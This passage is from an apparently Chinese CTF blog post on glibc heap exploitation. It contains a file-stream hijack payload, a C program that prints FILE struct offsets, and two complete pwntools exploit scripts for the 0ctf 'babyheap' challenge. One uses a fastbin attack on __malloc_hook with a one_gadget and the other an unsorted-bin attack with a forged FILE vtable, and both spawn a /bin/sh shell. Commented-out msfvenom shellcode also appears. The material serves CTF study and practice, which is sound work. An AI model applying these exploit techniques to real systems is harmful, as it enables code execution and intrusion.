libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">##hijack fsp</span></div><div class="line">save(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">0x28</span>+p64(<span class="number">0x110</span>+<span class="number">0x231</span>+<span class="number">0x1010</span>),<span class="string">"aaa\n"</span>)</div><div class="line">ru(<span class="string">"te on "</span>)</div><div class="line">addr_1 = int(ru(<span class="string">")\n"</span>)[<span class="number">2</span>:<span class="number">-2</span>],<span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(p,"b*0x040111A\nc")</span></div><div class="line">payload  = <span class="number">0x1c</span>*p64(system_addr)</div><div class="line">payload +=<span class="string">"/\x80||/////bin/sh\x00"</span> <span class="comment">#start fsp</span></div><div class="line">payload +=<span class="number">0x16</span>*p64(addr_1)+p64(<span class="number">0</span>)+(<span class="number">0x47</span><span class="number">-0x19</span>)*p64(addr_1)+p64(addr_1)+<span class="string">"\n"</span></div><div class="line"></div><div class="line">save(<span class="number">0x380</span>,p64(system_addr)*<span class="number">4</span>+<span class="string">"\n"</span>,payload)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>似乎有个可以直接用来算偏移的C源码，妈妈再也不用担心我算不准偏移啦~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    fp=<span class="built_in">stderr</span>;</div><div class="line">    <span class="keyword">int</span> chain=&amp;(fp-&gt;_chain);</div><div class="line">    <span class="keyword">int</span> flags=&amp;(fp-&gt;_flags);</div><div class="line">    <span class="keyword">int</span> dis=chain-flags;</div><div class="line">  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FILE struct size: 0x%x\n"</span>,<span class="keyword">sizeof</span>(FILE));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;chain - fp: 0x%x %x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> mode=&amp;(fp-&gt;_mode);</div><div class="line">    dis=mode-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;mode - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_ptr=&amp;(fp-&gt;_IO_write_ptr);</div><div class="line">    dis=write_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_base=&amp;(fp-&gt;_IO_write_base);</div><div class="line">    dis=write_base-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_base - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> vtable_offset=&amp;(fp-&gt;_vtable_offset);</div><div class="line">    dis=vtable_offset-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;vtable_offset - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> read_ptr=&amp;(fp-&gt;_IO_read_ptr);</div><div class="line">    dis=read_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;read_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div></pre></td></tr></table></figure></p>
<h3 id="0ctf-baby-heap"><a href="#0ctf-baby-heap" class="headerlink" title="0ctf baby heap"></a>0ctf baby heap</h3><p>这题有两种利用方式，一种是全程使用fastbin attack ，还有一种是既利用fast bin 又利用 unsorted bin attack</p>
<p>exp1 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-22 10:39:31</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"x86_64"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./babyheap"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># 	p = process(target)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># 	sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></div><div class="line">	ru(<span class="string">"Command:"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"Size: "</span>)</div><div class="line">	sl(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index,size,data)</span>:</span></div><div class="line">	ru(<span class="string">"Command: "</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"Index: "</span>)</div><div class="line">	sl(str(index))</div><div class="line">	ru(<span class="string">"Size: "</span>)</div><div class="line">	sl(str(size))</div><div class="line">	ru(<span class="string">"Content: "</span>)</div><div class="line">	sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"Command: "</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line">	ru(<span class="string">"Index: "</span>)</div><div class="line">	sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"Command: "</span>)</div><div class="line">	sl(<span class="string">"4"</span>)</div><div class="line">	ru(<span class="string">"Index: "</span>)</div><div class="line">	sl(str(index))</div><div class="line"></div><div class="line">add(<span class="number">0x20</span>) <span class="comment">#index0</span></div><div class="line">add(<span class="number">0x1e0</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index2</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index3</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free index1</span></div><div class="line"></div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x28</span>+<span class="string">"\x30"</span></div><div class="line"></div><div class="line">fill(<span class="number">0</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#index4</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free 1</span></div><div class="line">free(<span class="number">2</span>) <span class="comment">#free 2</span></div><div class="line"></div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line"></div><div class="line">dump(<span class="number">4</span>)</div><div class="line"></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">libc_bin_addr = u64(p.recv(<span class="number">8</span>))</div><div class="line"><span class="comment"># bin_offset = 0x3a5678</span></div><div class="line">one_gadget_offset = <span class="number">0x4425a</span></div><div class="line">local_bin_offset = <span class="number">0x3C4C58</span></div><div class="line">libc_base = libc_bin_addr - local_bin_offset</div><div class="line">libc.address = libc_base</div><div class="line"></div><div class="line">one_gadget_addr = one_gadget_offset+libc_base</div><div class="line"></div><div class="line">malloc_offset = <span class="number">0x3C4BD0</span></div><div class="line">malloc_addr = malloc_offset + libc_base</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#change index 4 meta</span></div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>)</div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">free(<span class="number">4</span>)</div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>,libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"></div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></div><div class="line">payload = flat(<span class="string">"\x00"</span>*<span class="number">19</span>,one_gadget_addr)</div><div class="line">fill(<span class="number">4</span>,len(payload),payload)</div><div class="line">raw_input()</div><div class="line">add(<span class="number">0x90</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_bin_addr="</span>+hex(libc_bin_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"libc_base="</span>+hex(libc_base)</div><div class="line"><span class="keyword">print</span> <span class="string">"one_gadget_addr="</span>+hex(one_gadget_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"malloc_addr="</span>+hex(malloc_addr)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>exp2 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">context(log_level = <span class="string">"debug"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(size))</div><div class="line">    r.recvuntil(<span class="string">': '</span>, timeout=<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(len(data)))</div><div class="line">    r.sendafter(<span class="string">': '</span>, data)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': \n'</span>)</div><div class="line">    data = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></div><div class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#5</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#6</span></div><div class="line">    free(<span class="number">1</span>)</div><div class="line">    free(<span class="number">2</span>)</div><div class="line"><span class="comment"># over lap</span></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p8(<span class="number">0xc0</span>)</div><div class="line">    fill(<span class="number">0</span>, payload)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#1</span></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># leak heap</span></div><div class="line">    </div><div class="line">    free(<span class="number">5</span>)</div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x61</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    heap_addr = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x120</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"heap_addr = "</span>+hex(heap_addr)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line"></div><div class="line"><span class="comment"># leak libc</span></div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0xc1</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    <span class="comment">#raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x50)</span></div><div class="line">    </div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line">    main_area = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</div><div class="line">    libc_base = main_area - <span class="number">0x3a5678</span></div><div class="line">    </div><div class="line">    libc.address = libc_base</div><div class="line"></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x58</span>)<span class="comment">#7</span></div><div class="line">    alloc(<span class="number">0x30</span>)<span class="comment">#8</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#9</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#10</span></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    payload = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x61</span>+<span class="number">0x60</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line"></div><div class="line">    fill(<span class="number">5</span>,<span class="string">"\x00"</span>*(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>+<span class="number">0x60</span>+<span class="number">0x40</span>))</div><div class="line"></div><div class="line">    free(<span class="number">6</span>)</div><div class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#4</span></div><div class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</div><div class="line">    <span class="comment"># print "b*"+hex(0x7CE9A+libc_base)</span></div><div class="line">    <span class="comment"># print util.proc.pidof(r)</span></div><div class="line"></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># unsorted bin attack </span></div><div class="line">    payload  = <span class="string">"\x00"</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>)+p64(main_area)+p64(libc_base+<span class="number">0x3A6040</span><span class="number">-0x10</span>)</div><div class="line">    payload  = payload.ljust(<span class="number">0x100</span><span class="number">-0x50</span>,<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line">    data = <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x101</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</div><div class="line">    data = data.ljust(<span class="number">0xc0</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(<span class="number">0xffffffffffffffff</span>)</div><div class="line">    data = data.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(heap_addr+<span class="number">0x30</span>*<span class="number">4</span>+<span class="number">0x10</span>+len(payload+data)<span class="number">-0x18</span>+<span class="number">8</span>)</div><div class="line">    data += p64(libc.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line">    </div><div class="line">    fill(<span class="number">4</span>,payload+data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line"></div><div class="line">    </div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># fill(2,p64(main_area)+p64(libc_base+0x3C5600-0x10))</span></div><div class="line"></div><div class="line">    <span class="comment"># print "IO_LIST="+hex(libc_base+0x3C5600)</span></div><div class="line">    <span class="comment"># alloc(0x58)#4</span></div><div class="line">    <span class="comment"># alloc(0x20)#7</span></div><div class="line">    <span class="comment"># alloc(0x20)#8</span></div><div class="line">    <span class="comment"># free(4)</span></div><div class="line">    </div><div class="line">    <span class="comment"># fill(3,p64(0)*5+p64(0x71))</span></div><div class="line">    <span class="comment"># fill(2, p64(libc.symbols['__malloc_hook']-0x23))</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x58)#9</span></div><div class="line">    <span class="comment"># alloc(0x58)</span></div><div class="line">    <span class="comment"># alloc(0x30)#10</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># payload  = '\x00'*3</span></div><div class="line">    <span class="comment"># payload += p64(0)*2</span></div><div class="line">    <span class="comment"># payload += p64(libc_base + 0x41374)</span></div><div class="line">    <span class="comment"># fill(6, payload)</span></div><div class="line"></div><div class="line">    <span class="comment"># alloc(255)</span></div><div class="line"></div><div class="line">    r.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    log.info(<span class="string">"For remote: %s HOST PORT"</span> % sys.argv[<span class="number">0</span>])</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</div><div class="line">        r = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</div><div class="line">        exploit(r)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        r = process([<span class="string">'./fastbin'</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">        </div><div class="line">        exploit(r)</div></pre></td></tr></table></figure>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/104144.html</a> （Linux堆内存管理深入分析（上））<br><a href="http://www.freebuf.com/articles/security-management/105285.html" target="_blank" rel="external">http://www.freebuf.com/articles/security-management/105285.html</a> （Linux堆内存管理深入分析（下））</p>
<p><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a> （浅析Linux堆溢出之fastbin）</p>
<p><a href="http://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="external">http://www.cnblogs.com/shangye/p/6268981.html</a> （ house of orange ）</p>
<p><a href="http://www.bitscn.com/network/hack/200607/30235.html" target="_blank" rel="external">http://www.bitscn.com/network/hack/200607/30235.html</a> （ FSO 利用 ）</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
        
